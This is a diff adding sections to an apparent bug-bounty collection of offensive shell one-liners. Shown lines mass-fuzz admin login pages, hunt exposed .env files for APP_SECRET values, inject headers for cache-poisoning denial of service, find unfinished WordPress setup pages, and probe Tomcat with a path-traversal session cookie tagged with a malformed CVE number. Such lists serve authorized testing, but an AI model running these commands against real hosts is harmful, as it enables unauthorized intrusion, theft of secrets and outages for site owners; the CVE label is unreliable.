@@ -51,6 +51,34 @@ cat subdomains | gau -subs |grep = |qsreplace "sstitest{{7*7}}" |ffuf -w - -u FU
 cat targets.txt | while read host do;do curl --insecure --silent -X GET $host/index.jsp -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy' | grep -qs "PersistentManagerBase" && \printf "$host \033[0;31mCVE-2020-948444\n"
 ```
 
+### FUZZING ADMIN LOGIN WITH HTTPX 
+- [ADMIN LOGIN WORDLIST](https://raw.githubusercontent.com/emadshanab/admin-login/main/admin-login.txt)
+
+```bash
+httpx -l allhosts -paths /root/admin-login.txt -threads 100 -random-agent -timeout 10 -tech-detect -status-code -follow-redirects -title -content-length
+```
+
+### fuzzing for .env using httpx
+
+```bash
+httpx -l hosts -path /api/.env -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -title -match-regex "APP_SECRET"
+```
+
+### Cache dos poisoning 
+
+```bash
+cat ~/domain.txt | httprobe | while read url;do ww=$(for i in "X-Oversized-Header-1: Big_Valuetestetstsetsetstsetestsetsetsetsetsetestsetsetsetsetsetsetsetsetsetesset" "X-Meta-Malicious-Header: \r\n" "X-HTTP-Method-Override: POST" "X-Forwarded-Port: 123" "X-Forwarded-Host: $url:123";do curl -s -L -I -H $i $url;done|grep HTTP|grep -v '301 '|awk '{ printf "%3d: %s\n", NR, $0 }');echo -e "\e[1;32m$url\e[0m""\n""$ww""\n";done
+```
+
+### WordPress Oneliner for a misconfigured WP login to setup page
+
+```bash
+httpx -l hosts.txt -threads 100 -paths /wp-admin/setup-config.php?step=1 -title -tech-detect -status-code
+```
+
+
+
+
 
 
 
